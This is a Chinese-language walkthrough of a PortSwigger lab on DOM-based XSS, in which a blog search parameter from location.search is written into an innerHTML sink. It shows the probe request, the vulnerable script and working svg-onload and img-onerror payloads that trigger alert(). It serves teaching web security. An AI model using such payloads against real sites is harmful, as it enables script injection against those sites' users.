# 实验：在使用 `location.search` 作为源的 `innerHTML` 汇点中的 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

本实验在博客搜索（search blog）功能中包含一个基于 DOM 的跨站脚本（XSS）漏洞。它使用了 `innerHTML` 赋值操作，该操作利用来自 `location.search` 的数据来更改 `div` 元素的 HTML 内容。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要调用 `alert` 函数。

## 步骤

- 探测
    - 使用搜索功能搜索独特字符串 `g91frxte`
        ```http
        GET /?search=g91frxte HTTP/2
        ```

    - 响应
        ```html
        <h1>
        <span>
            0 search results for '
        </span>
        <span id="searchMessage">
        </span>
        <span>
            '
        </span>
        </h1>

        <script>
        function doSearchQuery(query) {
            document.getElementById('searchMessage').innerHTML = query;
        }
        var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
            doSearchQuery(query);
        }
        </script>
        ```
        - 源 `window.location.search`，参数 `search`
        - 汇 `.innerHTML`
        - 上下文 `<span>位置</span>`
    
    - 浏览器渲染
        ```html
        <span id="searchMessage">g91frxte</span>
        ```

- 攻击
    - 载荷 `<svg onload=alert()>` 
        - 浏览器渲染
            ```html
            <span id="searchMessage">
                <svg onload="alert()"></svg>
            </span>
            ```
        - 成功弹窗
    - 载荷 `<img src onerror=alert()>` 
        - 浏览器渲染
            ```html
            <span id="searchMessage">
                <img src="" onerror="alert()">
            </span>
            ```
        - 成功弹窗
    - 载荷 `<script>alert()</script>` 弹窗失败，脚本未执行
